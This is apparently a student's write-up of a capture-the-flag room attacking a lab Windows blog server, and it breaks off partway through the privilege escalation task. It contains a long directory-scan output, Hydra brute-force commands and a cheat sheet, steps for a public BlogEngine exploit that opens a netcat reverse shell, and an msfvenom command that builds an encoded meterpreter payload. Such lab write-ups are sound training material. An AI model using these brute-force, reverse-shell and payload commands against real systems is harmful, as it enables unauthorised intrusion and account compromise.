/contact_head         (Status: 200) [Size: 9927]
/Contact Us           (Status: 200) [Size: 9925]
/search-tools         (Status: 200) [Size: 8400]
/archive02            (Status: 200) [Size: 8314]
/search_lockdown      (Status: 200) [Size: 8403]
/searchbox_top        (Status: 200) [Size: 8401]
/SearchIndex          (Status: 200) [Size: 8399]
/search_sm            (Status: 200) [Size: 8397]
/search_tweakmaster   (Status: 200) [Size: 8406]
/contactInformation   (Status: 200) [Size: 9933]
/search_ediuspro4     (Status: 200) [Size: 8404]
/search_sweaw         (Status: 200) [Size: 8400]
/ContactInfo          (Status: 200) [Size: 9926]
/search_dr            (Status: 200) [Size: 8397]
/search_msn           (Status: 200) [Size: 8398]
/search_office        (Status: 200) [Size: 8401]
/archive_2006-m08     (Status: 200) [Size: 8321]
/archive_2006-m12     (Status: 200) [Size: 8321]
/archive_2005-w43     (Status: 200) [Size: 8321]
/contact-lenses       (Status: 200) [Size: 9929]
/archive_2005-w23     (Status: 200) [Size: 8321]
/archive_2005-w14     (Status: 200) [Size: 8321]
/archive_2005-w18     (Status: 200) [Size: 8321]
/archive_2005-w16     (Status: 200) [Size: 8321]
/contact_forms        (Status: 200) [Size: 9928]
/search-1             (Status: 200) [Size: 8396]
/search-line          (Status: 200) [Size: 8399]
/default4             (Status: 500) [Size: 1763]
/search_label         (Status: 200) [Size: 8400]
/searchNetworking     (Status: 200) [Size: 8404]
/searchtool           (Status: 200) [Size: 8398]
/search-help          (Status: 200) [Size: 8399]
/SearchEngines        (Status: 200) [Size: 8401]
/searchHelpPage       (Status: 200) [Size: 8402]
/search_02            (Status: 200) [Size: 8397]
/search_01            (Status: 200) [Size: 8397]
/contact_web          (Status: 200) [Size: 9926]
/default_new          (Status: 500) [Size: 1763]
/default_fr           (Status: 500) [Size: 1763]
/archives_off         (Status: 200) [Size: 8317]
/contactcw            (Status: 200) [Size: 9924]
/archive_2006-m02     (Status: 200) [Size: 8321]
/archive_2006-m03     (Status: 200) [Size: 8321]
/archive_2006-m04     (Status: 200) [Size: 8321]
/search-en            (Status: 200) [Size: 8397]
/search_new           (Status: 200) [Size: 8398]
/default-avatar       (Status: 500) [Size: 1763]
/contactless          (Status: 200) [Size: 9926]
/contact_top          (Status: 200) [Size: 9926]
/search97cgi          (Status: 200) [Size: 8399]
/contactbut           (Status: 200) [Size: 9925]
/contact_new          (Status: 200) [Size: 9926]
/http%3A%2F%2Fblog    (Status: 200) [Size: 9008]
/Contact_WWW          (Status: 200) [Size: 9926]
/Contact_Blog         (Status: 200) [Size: 9927]
/Contact_OffLine      (Status: 200) [Size: 9930]
/searchTop            (Status: 200) [Size: 8397]
/archive2005          (Status: 200) [Size: 8316]
/contact_reseller     (Status: 200) [Size: 9931]
/contactu             (Status: 200) [Size: 9923]
/archivespg2          (Status: 200) [Size: 8316]
/contact_address      (Status: 200) [Size: 9930]
/contactmap_large     (Status: 200) [Size: 9931]
/contactmap_small     (Status: 200) [Size: 9931]
/contacttitle         (Status: 200) [Size: 9927]
/search_6             (Status: 200) [Size: 8396]
/searchpro            (Status: 200) [Size: 8397]
/contact_secunia      (Status: 200) [Size: 9930]
/searchcloud          (Status: 200) [Size: 8399]
/search_end           (Status: 200) [Size: 8398]
/Contact_AddressBook  (Status: 200) [Size: 9934]
/DefaultLoginsandPasswordsforNetworkedDevices (Status: 500) [Size: 1763]
/search_search        (Status: 200) [Size: 8401]
/archive2002          (Status: 200) [Size: 8316]
/archive2000          (Status: 200) [Size: 8316]
/Archive_Zip          (Status: 200) [Size: 8316]
/Archive_Tar          (Status: 200) [Size: 8316]
/Search_Mnogosearch   (Status: 200) [Size: 8406]
/SCRIPTS              (Status: 301) [Size: 151] [--> http://10.10.113.96/SCRIPTS/]
/search_contents      (Status: 200) [Size: 8403]
/search_packages      (Status: 200) [Size: 8403]
/search_on            (Status: 200) [Size: 8397]
/contactmap_thumb     (Status: 200) [Size: 9931]
/contact_on           (Status: 200) [Size: 9925]
/**http%3A%2F%2Fwww   (Status: 500) [Size: 1763]
/contact_a            (Status: 200) [Size: 9924]
/searchout            (Status: 200) [Size: 8397]
/contact_osdl         (Status: 200) [Size: 9927]
/DEFAULT              (Status: 500) [Size: 1763]
/contactVOA           (Status: 200) [Size: 9925]
/search_srcHeader     (Status: 200) [Size: 8404]
/searchareaborder     (Status: 200) [Size: 8404]
/ContactOff           (Status: 200) [Size: 9925]
/contact%20us         (Status: 200) [Size: 9925]
/searchtitle          (Status: 200) [Size: 8399]
/search-cat           (Status: 200) [Size: 8398]
/searchbottom         (Status: 200) [Size: 8400]
/searchhistory        (Status: 200) [Size: 8401]
/searchlogo_dmoz      (Status: 200) [Size: 8403]
/contact_remove       (Status: 200) [Size: 9929]
/DefaultAd            (Status: 500) [Size: 1763]
/search_city          (Status: 200) [Size: 8399]
/searchType           (Status: 200) [Size: 8398]
/default-e            (Status: 500) [Size: 1763]
/contactUsForm        (Status: 200) [Size: 9928]
/search-btn           (Status: 200) [Size: 8398]
/searchinform         (Status: 200) [Size: 8400]
/default_e            (Status: 500) [Size: 1763]
/contacts_fr          (Status: 200) [Size: 9926]
/searchdetail         (Status: 200) [Size: 8400]
/search_slant         (Status: 200) [Size: 8400]
/Contact_Information  (Status: 200) [Size: 9934]
/contactdetails       (Status: 200) [Size: 9929]
/contactless_cre      (Status: 200) [Size: 9930]
/archive_button       (Status: 200) [Size: 8319]
/SearchBox            (Status: 200) [Size: 8397]
/search-button        (Status: 200) [Size: 8401]
/contacthp            (Status: 200) [Size: 9924]
/ContactUsHome        (Status: 200) [Size: 9928]
/contactusbutton      (Status: 200) [Size: 9930]
/search-name          (Status: 200) [Size: 8399]
/contact-emb          (Status: 200) [Size: 9926]
/contact_0            (Status: 200) [Size: 9924]
/ContactMe            (Status: 200) [Size: 9924]
/contact_pre          (Status: 200) [Size: 9926]
/searchjb             (Status: 200) [Size: 8396]
/searchcareers        (Status: 200) [Size: 8401]
/archives05           (Status: 200) [Size: 8315]
/contact01            (Status: 200) [Size: 9924]
/search_yellow        (Status: 200) [Size: 8401]
/archives03           (Status: 200) [Size: 8315]
/Search2              (Status: 200) [Size: 8395]
/Contact_Sales        (Status: 200) [Size: 9928]
/searchSecurityChannel (Status: 200) [Size: 8409]
/search_angle         (Status: 200) [Size: 8400]
/contact0             (Status: 200) [Size: 9923]
/search-box           (Status: 200) [Size: 8398]
/defaultEN            (Status: 500) [Size: 1763]
/searchengineoptimization (Status: 200) [Size: 8412]
/searchlight          (Status: 200) [Size: 8399]
/search-animated      (Status: 200) [Size: 8403]
/contact_btn          (Status: 200) [Size: 9926]
/contactyourlegislator (Status: 200) [Size: 9936]
/archive01            (Status: 200) [Size: 8314]
/SearchTips           (Status: 200) [Size: 8398]
/default_de           (Status: 500) [Size: 1763]
/searchAction         (Status: 200) [Size: 8400]
/search_fr            (Status: 200) [Size: 8397]
/defaultcitati-20     (Status: 500) [Size: 1763]
/search_corner        (Status: 200) [Size: 8401]
/searchtext           (Status: 200) [Size: 8398]
/default_triangle     (Status: 500) [Size: 1763]
/SearchAgent          (Status: 200) [Size: 8399]
/search_curve         (Status: 200) [Size: 8400]
/archive-other        (Status: 200) [Size: 8318]
/default-en           (Status: 500) [Size: 1763]
/archive-coe          (Status: 200) [Size: 8316]
/archivesdate         (Status: 200) [Size: 8317]
/CUSTOM               (Status: 301) [Size: 150] [--> http://10.10.113.96/CUSTOM/]
/archive-crawler      (Status: 200) [Size: 8320]
/contactHP            (Status: 200) [Size: 9924]
/contacter            (Status: 200) [Size: 9924]
/archiveMortgages     (Status: 200) [Size: 8321]
/contact_ico          (Status: 200) [Size: 9926]
/devinmoore*          (Status: 500) [Size: 1763]
/searchulator         (Status: 200) [Size: 8400]
/searchulatorForm     (Status: 200) [Size: 8404]
/contactrepCFM        (Status: 200) [Size: 9928]
/Archive2006          (Status: 200) [Size: 8316]
/search-bottom        (Status: 200) [Size: 8401]
/searchSteps          (Status: 200) [Size: 8399]
/archive_2006-m05     (Status: 200) [Size: 8321]
/search_e             (Status: 200) [Size: 8396]
/contacts_blue        (Status: 200) [Size: 9928]
/Search_Bots          (Status: 200) [Size: 8399]
/defaultseite         (Status: 500) [Size: 1763]
/contact_base         (Status: 200) [Size: 9927]
/searchcap            (Status: 200) [Size: 8397]
/archive_2005-m10     (Status: 200) [Size: 8321]
/archive_2005-m12     (Status: 200) [Size: 8321]
/archive_2004-m01     (Status: 200) [Size: 8321]
/archive_2005-m01     (Status: 200) [Size: 8321]
/archive_2005-m09     (Status: 200) [Size: 8321]
/archive_2005-m02     (Status: 200) [Size: 8321]
/archive_2005-m08     (Status: 200) [Size: 8321]
/archive_2006-m01     (Status: 200) [Size: 8321]
/search_tab           (Status: 200) [Size: 8398]
/Searchresults        (Status: 200) [Size: 8401]
/Contact_Info         (Status: 200) [Size: 9927]
/search_headlines     (Status: 200) [Size: 8404]
/archives_title       (Status: 200) [Size: 8319]
/search_hd            (Status: 200) [Size: 8397]
/searchFor            (Status: 200) [Size: 8397]
/Archive-TarGzip      (Status: 200) [Size: 8320]
/contactform_menu     (Status: 200) [Size: 9931]
/default_images       (Status: 500) [Size: 1763]
/ContactPage          (Status: 200) [Size: 9926]
/default_english      (Status: 500) [Size: 1763]
/archive_2005         (Status: 200) [Size: 8317]
/Archives_Map         (Status: 200) [Size: 8317]
/SearchQA             (Status: 200) [Size: 8396]
/contactos            (Status: 200) [Size: 9924]
/default_5            (Status: 500) [Size: 1763]
/Search%20results     (Status: 200) [Size: 8402]
/search_home          (Status: 200) [Size: 8399]
/SearchResults_BG     (Status: 200) [Size: 8404]
/Contact-us           (Status: 200) [Size: 9925]
/ARCHIVES             (Status: 200) [Size: 8313]
/SearchAdvanced       (Status: 200) [Size: 8402]
/KeithRankin%20       (Status: 500) [Size: 1763]
/default_ecdvd        (Status: 500) [Size: 1763]
/default_XML          (Status: 500) [Size: 1763]
/SearchWiki           (Status: 200) [Size: 8398]
/defaultnew           (Status: 500) [Size: 1763]
/searchStorage        (Status: 200) [Size: 8401]
/search-ccsb          (Status: 200) [Size: 8399]
/search-au            (Status: 200) [Size: 8397]
/contactcenter        (Status: 200) [Size: 9928]
/default3             (Status: 500) [Size: 1763]
/searchLeft           (Status: 200) [Size: 8398]
/search_swf           (Status: 200) [Size: 8398]
/search_aurora        (Status: 200) [Size: 8401]
/search_drweb33       (Status: 200) [Size: 8402]
/search_yassakv6      (Status: 200) [Size: 8403]
/searchegnine         (Status: 200) [Size: 8400]
/searchpages          (Status: 200) [Size: 8399]
/search_vibeke        (Status: 200) [Size: 8401]
/search_warcraft      (Status: 200) [Size: 8403]
/search_driver-detective (Status: 200) [Size: 8411]
/search_dicey-business (Status: 200) [Size: 8409]
/search_oban          (Status: 200) [Size: 8399]
/search_model         (Status: 200) [Size: 8400]
/search_rape          (Status: 200) [Size: 8399]
/search_sandra        (Status: 200) [Size: 8401]
/search_regcure       (Status: 200) [Size: 8402]
/search_sandra-mod    (Status: 200) [Size: 8405]
/searchspace          (Status: 200) [Size: 8399]
/search_sandra-model  (Status: 200) [Size: 8407]
/search_vibeke-skofterud (Status: 200) [Size: 8411]
/search_acdsee        (Status: 200) [Size: 8401]
/search_teen          (Status: 200) [Size: 8399]
/search_anal          (Status: 200) [Size: 8399]
/search_lolita        (Status: 200) [Size: 8401]
/search_pfconfig      (Status: 200) [Size: 8403]
/search_Skofterud     (Status: 200) [Size: 8404]
/search_XBOX360       (Status: 200) [Size: 8402]
/search_E35614A8-CAB  (Status: 200) [Size: 8407]
/search_system-mechanic (Status: 200) [Size: 8410]
/search_Prison-break  (Status: 200) [Size: 8407]
/archives-en          (Status: 200) [Size: 8316]
/searchtorrents       (Status: 200) [Size: 8402]
/SearchAppSecurity    (Status: 200) [Size: 8405]
/search_v3            (Status: 200) [Size: 8397]
/default_728x90       (Status: 500) [Size: 1763]
/archives_en          (Status: 200) [Size: 8316]
/contactOff           (Status: 200) [Size: 9925]
/contactcongress      (Status: 200) [Size: 9930]
/Search_0             (Status: 200) [Size: 8396]
/archive_virus        (Status: 200) [Size: 8318]
/searchblogbook       (Status: 200) [Size: 8402]
/searchworld          (Status: 200) [Size: 8399]
/searchmob            (Status: 200) [Size: 8397]
/searchenginewatch    (Status: 200) [Size: 8405]
/contact-e            (Status: 200) [Size: 9924]
/ContactYourRegulator (Status: 200) [Size: 9935]
/contact-faq          (Status: 200) [Size: 9926]
/default6             (Status: 500) [Size: 1763]
/search_btn1          (Status: 200) [Size: 8399]
/Wanted%2e%2e%2e      (Status: 500) [Size: 1763]
/How_to%2e%2e%2e      (Status: 500) [Size: 1763]
/contact_csp          (Status: 200) [Size: 9926]
/contactmap           (Status: 200) [Size: 9925]
/default_120X600      (Status: 500) [Size: 1763]
/archive-032005       (Status: 200) [Size: 8319]
/contact_email        (Status: 200) [Size: 9928]
/default_03           (Status: 500) [Size: 1763]
/default_02           (Status: 500) [Size: 1763]
/default_01           (Status: 500) [Size: 1763]
/contact_1            (Status: 200) [Size: 9924]
/searchlogo           (Status: 200) [Size: 8398]
/contactNav-off       (Status: 200) [Size: 9929]
/kaspersky%20         (Status: 500) [Size: 1763]
/search_up            (Status: 200) [Size: 8397]
/search_img           (Status: 200) [Size: 8398]
/search_Virus-Bursters (Status: 200) [Size: 8409]
/search_REGCURE       (Status: 200) [Size: 8402]
/search_Driver-detective (Status: 200) [Size: 8411]
/search_ACDSee        (Status: 200) [Size: 8401]
/search_Style         (Status: 200) [Size: 8400]
/search_Moyea         (Status: 200) [Size: 8400]
/search_Medieval      (Status: 200) [Size: 8403]
/search_DFX           (Status: 200) [Size: 8398]
/search_winzip        (Status: 200) [Size: 8401]
/search_anno          (Status: 200) [Size: 8399]
/search_WinDVD        (Status: 200) [Size: 8401]
/search_nfs-carbon    (Status: 200) [Size: 8405]
/search_virusbursters (Status: 200) [Size: 8408]
/search_virtual       (Status: 200) [Size: 8402]
/search_carbon        (Status: 200) [Size: 8401]
/search_registry-mechanic (Status: 200) [Size: 8412]
/search_convertmovie  (Status: 200) [Size: 8407]
/search_power-dvd     (Status: 200) [Size: 8404]
/search_diskeeper     (Status: 200) [Size: 8404]
/search_bitdefender   (Status: 200) [Size: 8406]
/search_neverwinter-nights (Status: 200) [Size: 8413]
/search_camfrog       (Status: 200) [Size: 8402]
/search_gothic        (Status: 200) [Size: 8401]
/search_norton-2007   (Status: 200) [Size: 8406]
/search_VirusBusters  (Status: 200) [Size: 8407]
/search_any-dvd       (Status: 200) [Size: 8402]
/contactpersonen      (Status: 200) [Size: 9930]
/search_dvdfab-platinum (Status: 200) [Size: 8410]
/search_anno-1701     (Status: 200) [Size: 8404]
/search_large         (Status: 200) [Size: 8400]
/search-form          (Status: 200) [Size: 8399]
/search_5             (Status: 200) [Size: 8396]
/contactinformatie    (Status: 200) [Size: 9932]
/contactsalesform     (Status: 200) [Size: 9931]
/searchleftcap        (Status: 200) [Size: 8401]
/searchrightcap       (Status: 200) [Size: 8402]
/archive_page         (Status: 200) [Size: 8317]
/Contact-PartSelect   (Status: 200) [Size: 9933]
/archive-1            (Status: 200) [Size: 8314]
/searchnist           (Status: 200) [Size: 8398]
/search_banner        (Status: 200) [Size: 8401]
/default-1            (Status: 500) [Size: 1763]
/searchplugin         (Status: 200) [Size: 8400]
/contact_dymeta       (Status: 200) [Size: 9929]
/archived_webcasts    (Status: 200) [Size: 8322]
/searchinventory      (Status: 200) [Size: 8403]
/searchedgar          (Status: 200) [Size: 8399]
/defaultads           (Status: 500) [Size: 1763]
/searchspy            (Status: 200) [Size: 8397]
/contactsap           (Status: 200) [Size: 9925]
/Searches             (Status: 200) [Size: 8396]
/search_templates     (Status: 200) [Size: 8404]
/200109*              (Status: 500) [Size: 1763]
/searchinsider        (Status: 200) [Size: 8401]
/default_2002         (Status: 500) [Size: 1763]
/default_2001         (Status: 500) [Size: 1763]
/default_2000         (Status: 500) [Size: 1763]
/default_1998         (Status: 500) [Size: 1763]
/default_1999         (Status: 500) [Size: 1763]
/searchExchange       (Status: 200) [Size: 8402]
/contact_aod          (Status: 200) [Size: 9926]
/contact_station      (Status: 200) [Size: 9930]
/contactOn            (Status: 200) [Size: 9924]
/archive-data         (Status: 200) [Size: 8317]
/*sa_                 (Status: 500) [Size: 1763]
/*dc_                 (Status: 500) [Size: 1763]
/searchbyisbn         (Status: 200) [Size: 8400]
/contact_faq          (Status: 200) [Size: 9926]
/searchforlife        (Status: 200) [Size: 8401]
/contactus30          (Status: 200) [Size: 9926]
/contact_cert         (Status: 200) [Size: 9927]
/search-browse        (Status: 200) [Size: 8401]
/archiveScriptingCom  (Status: 200) [Size: 8324]
/searchOpenSource     (Status: 200) [Size: 8404]
/contactformIAc       (Status: 200) [Size: 9929]
/searchBottom         (Status: 200) [Size: 8400]
/archive-112005       (Status: 200) [Size: 8319]
/ContactUsOff         (Status: 200) [Size: 9927]
/searchproducts       (Status: 200) [Size: 8402]
/contactus_form       (Status: 200) [Size: 9929]
/contact-sales        (Status: 200) [Size: 9928]
/search_f             (Status: 200) [Size: 8396]
/contact_landing      (Status: 200) [Size: 9930]
/SearchExplorer       (Status: 200) [Size: 8402]
/search_book          (Status: 200) [Size: 8399]
/archive_l            (Status: 200) [Size: 8314]
/Default3194          (Status: 500) [Size: 1763]
/archivetop           (Status: 200) [Size: 8315]
/contactDice          (Status: 200) [Size: 9926]
/search_news          (Status: 200) [Size: 8399]
/searchirc            (Status: 200) [Size: 8397]
/contact-innovationowl (Status: 200) [Size: 9936]
/searchHelp           (Status: 200) [Size: 8398]
/search_launch        (Status: 200) [Size: 8401]
/contactfortune       (Status: 200) [Size: 9929]
/contactmanager       (Status: 200) [Size: 9929]
/Archive_1            (Status: 200) [Size: 8314]
/archive_front        (Status: 200) [Size: 8318]
/searchlabel          (Status: 200) [Size: 8399]
/archive-052005       (Status: 200) [Size: 8319]
/searchredir          (Status: 200) [Size: 8399]
/SETUP                (Status: 302) [Size: 174] [--> http://10.10.113.96/Account/login.aspx?ReturnUrl=%2fSETUP]
/contact_management   (Status: 200) [Size: 9933]
/contact_advertise    (Status: 200) [Size: 9932]
/searchmodule         (Status: 200) [Size: 8400]
/Search%20Engine      (Status: 200) [Size: 8401]
/search_cat           (Status: 200) [Size: 8398]
/archivedproducts     (Status: 200) [Size: 8321]
/default-red          (Status: 500) [Size: 1763]
/contactsyndication   (Status: 200) [Size: 9933]
/contactperson        (Status: 200) [Size: 9928]
/searchcovers         (Status: 200) [Size: 8400]
/search_sub           (Status: 200) [Size: 8398]
/searchbox_bottom     (Status: 200) [Size: 8404]
/search4              (Status: 200) [Size: 8395]
/searchframe          (Status: 200) [Size: 8399]
/search_w             (Status: 200) [Size: 8396]
/search_cc            (Status: 200) [Size: 8397]
/contact-cl           (Status: 200) [Size: 9925]
/contact_webmaster    (Status: 200) [Size: 9932]
/archives3            (Status: 200) [Size: 8314]
/search_btm           (Status: 200) [Size: 8398]
/CONTACT%20US         (Status: 200) [Size: 9925]
/search_all           (Status: 200) [Size: 8398]
/contact-editor       (Status: 200) [Size: 9929]
/Contact-Tables       (Status: 200) [Size: 9929]
/contactb             (Status: 200) [Size: 9923]
/contactbox           (Status: 200) [Size: 9925]
/archive1999          (Status: 200) [Size: 8316]
/search_lost          (Status: 200) [Size: 8399]
/search_house         (Status: 200) [Size: 8400]
/search_prison-break  (Status: 200) [Size: 8407]
/search_psp           (Status: 200) [Size: 8398]
/search_smallville    (Status: 200) [Size: 8405]
/search_happy-feet    (Status: 200) [Size: 8405]
/search_heroes        (Status: 200) [Size: 8401]
/search_greys-anatomy (Status: 200) [Size: 8408]
/search_desperate-housewives (Status: 200) [Size: 8415]
/search_apocalypto    (Status: 200) [Size: 8405]
/search_casino-royale (Status: 200) [Size: 8408]
/search_call-duty     (Status: 200) [Size: 8404]
/search_borat         (Status: 200) [Size: 8400]
/search_deja          (Status: 200) [Size: 8399]
/search_axxo          (Status: 200) [Size: 8399]
/searchbar_header     (Status: 200) [Size: 8404]
/archive_list         (Status: 200) [Size: 8317]
/defaultgravatar      (Status: 500) [Size: 1763]
/search_ico           (Status: 200) [Size: 8398]
/archive_1            (Status: 200) [Size: 8314]
/archivejoymain       (Status: 200) [Size: 8319]
/archive200409        (Status: 200) [Size: 8318]
/archive200408        (Status: 200) [Size: 8318]
/archive200410        (Status: 200) [Size: 8318]
/archive200407        (Status: 200) [Size: 8318]
/archive200412        (Status: 200) [Size: 8318]
/archive200501        (Status: 200) [Size: 8318]
/archive200502        (Status: 200) [Size: 8318]
/archive200503        (Status: 200) [Size: 8318]
/archive200406        (Status: 200) [Size: 8318]
/archive200504        (Status: 200) [Size: 8318]
/archive200405        (Status: 200) [Size: 8318]
/archive200505        (Status: 200) [Size: 8318]
/archive200403        (Status: 200) [Size: 8318]
/archive200404        (Status: 200) [Size: 8318]
/archive200506        (Status: 200) [Size: 8318]
/archive200607        (Status: 200) [Size: 8318]
/archive200507        (Status: 200) [Size: 8318]
/archive200606        (Status: 200) [Size: 8318]
/archive200509        (Status: 200) [Size: 8318]
/archive200511        (Status: 200) [Size: 8318]
/archive200508        (Status: 200) [Size: 8318]
/archive200512        (Status: 200) [Size: 8318]
/archive200601        (Status: 200) [Size: 8318]
/archive200602        (Status: 200) [Size: 8318]
/archive200603        (Status: 200) [Size: 8318]
/archive200604        (Status: 200) [Size: 8318]
/contact_small        (Status: 200) [Size: 9928]
/archived_topics      (Status: 200) [Size: 8320]
/SearchKB             (Status: 200) [Size: 8396]
/ContactInvestorRelations (Status: 200) [Size: 9939]
/searchmarketing      (Status: 200) [Size: 8403]
/searchAdvanced       (Status: 200) [Size: 8402]
/search-l             (Status: 200) [Size: 8396]
/searchArticle        (Status: 200) [Size: 8401]
/search-software      (Status: 200) [Size: 8403]
/searchviews          (Status: 200) [Size: 8399]
/search%20engine%20share%2072906 (Status: 200) [Size: 8413]
/archivedStory        (Status: 200) [Size: 8318]
/searchline           (Status: 200) [Size: 8398]
/search_airfare       (Status: 200) [Size: 8402]
/search-img           (Status: 200) [Size: 8398]
/search-more          (Status: 200) [Size: 8399]
/search-glass         (Status: 200) [Size: 8400]
/search_page          (Status: 200) [Size: 8399]
/contact_inline       (Status: 200) [Size: 9929]
/search_members       (Status: 200) [Size: 8402]
/SearchCustomization  (Status: 200) [Size: 8407]
/SearchEngine         (Status: 200) [Size: 8400]
/search-jobs          (Status: 200) [Size: 8399]
/searchfeedback       (Status: 200) [Size: 8402]
/searcharrow          (Status: 200) [Size: 8399]
/contactpr            (Status: 200) [Size: 9924]
/contact_request      (Status: 200) [Size: 9930]
/contact_header       (Status: 200) [Size: 9929]
/archivelist          (Status: 200) [Size: 8316]
/searchmenu           (Status: 200) [Size: 8398]
/searchheader         (Status: 200) [Size: 8400]
/SearchServlet        (Status: 200) [Size: 8401]
/SearchUserServlet    (Status: 200) [Size: 8405]
/search_styles        (Status: 200) [Size: 8401]
/search_getoffers     (Status: 200) [Size: 8404]
/Search1              (Status: 200) [Size: 8395]
/search_b             (Status: 200) [Size: 8396]
/archive_2005-w01     (Status: 200) [Size: 8321]
/archive_2005-w49     (Status: 200) [Size: 8321]
/archive_2006-w05     (Status: 200) [Size: 8321]
/archive_2006-w08     (Status: 200) [Size: 8321]
/archive_2006-w15     (Status: 200) [Size: 8321]
/archive_2006-w18     (Status: 200) [Size: 8321]
/archive_2006-w34     (Status: 200) [Size: 8321]
/archive_2006-w20     (Status: 200) [Size: 8321]
/archive_2006-m09     (Status: 200) [Size: 8321]
/archive_2006-m10     (Status: 200) [Size: 8321]
/archive_2005-w31     (Status: 200) [Size: 8321]
/archive_2005-w02     (Status: 200) [Size: 8321]
/archive_2005-w46     (Status: 200) [Size: 8321]
/archive_2005-w15     (Status: 200) [Size: 8321]
/archive_2005-w13     (Status: 200) [Size: 8321]
/archive_2005-w21     (Status: 200) [Size: 8321]
/archive_2005-w24     (Status: 200) [Size: 8321]
/archive_2005-w17     (Status: 200) [Size: 8321]
/archive_2005-w20     (Status: 200) [Size: 8321]
/archive_2005-w27     (Status: 200) [Size: 8321]
/archive_2005-w05     (Status: 200) [Size: 8321]
/default_image        (Status: 500) [Size: 1763]
/contacts_en          (Status: 200) [Size: 9926]
/search-text          (Status: 200) [Size: 8399]
/defaultSeite         (Status: 500) [Size: 1763]
/searchengineinphp    (Status: 200) [Size: 8405]
/searchicon           (Status: 200) [Size: 8398]
/searchSMB            (Status: 200) [Size: 8397]
/contact_nav          (Status: 200) [Size: 9926]
/default_image265     (Status: 500) [Size: 1763]
/searchmanual         (Status: 200) [Size: 8400]
/search_9             (Status: 200) [Size: 8396]
/searchdeep_97x72     (Status: 200) [Size: 8404]
/archive_j            (Status: 200) [Size: 8314]
/contactbug           (Status: 200) [Size: 9925]
/contactusmsft        (Status: 200) [Size: 9928]
/Cirque%20du%20soleil%20 (Status: 500) [Size: 1763]
/contact-support      (Status: 200) [Size: 9930]
/contactN             (Status: 200) [Size: 9923]
/DefaultConfPop       (Status: 500) [Size: 1763]
/SearchIndexingRobotsSecurity (Status: 200) [Size: 8416]
/contacting-me        (Status: 200) [Size: 9928]
```


## Task 2 - Hyrda and brute forcing a login

Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.

**Answer the questions below**

We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a `GET` request which is used to request data from a webserver and a `POST` request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).

*What request type is the Windows website login form using?* P[REDACTED]T

Now we know the request type and have a URL for the login form, we can get started brute-forcing an account. 

Run the following command but fill in the blanks:
```bash
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
```

Guess a username, choose a password list and gain credentials to a user account!

I looked up the default credentials for the application, figuring that the default username was probably not changed, only the password.
I had some trouble getting the Hydra command correct. 
* First error came quickly. I wasn't aware that it needed the variables' locations in the syntax. 
* I didn't realize that the command above didn't show the fact that the `<ip>` wasn't supposed to include the server path. The command above should be appended with the path `"/Account/login.aspx?ReturnURL=/admin"`. I put it in quotes since it has slashes to be safe, but more errors.
* Some trial and error, ok, a lot of trial and error, and I finally caught the full command syntax in BurpSuite. It was looonnng. 
* I did have to consult the walkthrough attached to the room to get the final piece of the puzzle which included some colons, and the failure message. Item 4 in the cheat sheat below is pretty close to the process. I just hadn't scrolled down to read it until after I looked at the walkthrough.

*Account password:* 1[REDACTEDX]x

Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the http-post-form that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. 

Below is a mini cheatsheet:

| Command | Description |
|---|---|
| `hydra -P <wordlist> -v <ip> <protocol>` | Brute force against a protocol of your choice |
| `hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>` | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (`-vV` = verbose mode, showing login attempts) |
| `hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>` | Attack a Windows Remote Desktop with a password list. |
| `hydra -l <username> -P <password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | Craft a more specific request for Hydra to brute force. |


## Task 3 -  Compromise the machine

In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com)) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

**Answer the questions below**

*Now you have logged into the website, are you able to identify the version of the BlogEngine?* 3[REDACTED]0

*Use the [exploit database archive](http://www.exploit-db.com) to find an exploit to gain a reverse shell on this system. What is the CVE?* CVE-[REDACTED]
* Search `exploit-db.com` for BlogEngine and the version number.
* Download the exploit.
* Update the callback <ip> to match your attack machine.
* Change the port number if desired.
* Rename the script as directed in the exploit.
* Upload the script to the target web server.
	* This is done using the upload function. Select the existing post.
	* Then select the upload icon in the menu bar.
	* In the dialog box, navigate to the location of the newly named exploit script.
	* Click upload. 
* Open a netcat listener on the same port as the script.
* Access the main blog page using the `theme` override as directed in the script.
* A reverse shell should trigger on your attack machine.

*Using the public exploit, gain initial access to the server. Who is the webserver running as?* II[REDACTED]og

Use the `whoamI` command to get the username.


## Task 4 - Windows Privilege Escalation

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

**Answer the questions below** 

Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.

If you don't know how to do this, I suggest completing the [Metasploit](https://tryhackme.com/room/rpmetasploit) room first!  

_Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!_

You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.

The process:

* Create a Metasploit payload in `msfvenom`. 
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```  
* Replace the IP with your attack machine's.
* Replace the port with one of your choosing.
* Select a name for your shell and run the command.
* Start a web server on your attack machine in the directory where the payload file is located. `python3 -m http.server`.
